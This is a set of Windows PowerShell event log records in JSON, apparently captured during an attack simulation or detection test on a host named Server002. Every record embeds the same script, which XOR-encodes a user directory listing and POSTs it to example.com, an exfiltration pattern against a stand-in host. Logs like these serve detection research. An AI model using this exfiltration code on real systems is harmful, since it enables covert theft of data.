{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.5268199"},"EventRecordID":"1043","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.5268199"},"EventRecordID":"1044","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.5268199"},"EventRecordID":"1045","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.5456335"},"EventRecordID":"1046","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.5456335"},"EventRecordID":"1047","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.5456335"},"EventRecordID":"1048","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:06.6987878"},"EventRecordID":"1049","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=e9ad5a0f-2808-4a85-a6fa-3392d0af1d0e\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-25 11:13:09.2342674"},"EventRecordID":"1050","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=16\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=e87d6522-23fa-4501-a905-e9fde70c3333\r\n\tHostApplication=powershell.exe &amp; {$plaintext = ([system.Text.Encoding]::UTF8.getBytes(\"Path\\n----\\nC:\\Users\\victim\"))\r\n$key = \"abcdefghijklmnopqrstuvwxyz123456\"\r\n$cyphertext = @();\r\nfor ($i = 0; $i -lt $plaintext.Count; $i++) {\r\n $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];\r\n}\r\n$cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)\r\n[System.Net.ServicePointManager]::Expect100Continue = $false\r\nInvoke-WebRequest -Uri example.com -Method POST -Body $cyphertext -DisableKeepAlive}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=e9ad5a0f-2808-4a85-a6fa-3392d0af1d0e\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
